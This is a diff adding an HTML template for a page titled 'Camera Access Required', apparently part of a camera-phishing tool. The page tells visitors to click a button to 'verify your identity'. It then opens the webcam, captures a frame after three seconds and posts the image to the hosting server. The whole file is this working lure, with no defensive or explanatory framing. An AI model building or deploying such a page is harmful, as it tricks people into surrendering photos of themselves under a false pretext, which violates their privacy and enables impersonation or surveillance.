@@ -1,0 +1,43 @@
+<!-- templates/index.html -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Access Required</title>
+</head>
+<body>
+    <h2>Please click the button below to verify your identity.</h2>
+    <button id="start-camera">Start Camera</button>
+    <script>
+        document.getElementById('start-camera').addEventListener('click', function() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    document.body.appendChild(canvas);
+
+                    setTimeout(() => {
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob(function(blob) {
+                            const xhr = new XMLHttpRequest();
+                            xhr.open('POST', '/', true);
+                            xhr.send(blob);
+                            alert('Image captured and sent!');
+                        });
+                    }, 3000); // Capture after 3 seconds
+
+                })
+                .catch(function(error) {
+              
+                });
+        });
+    </script>
+</body>
+</html>
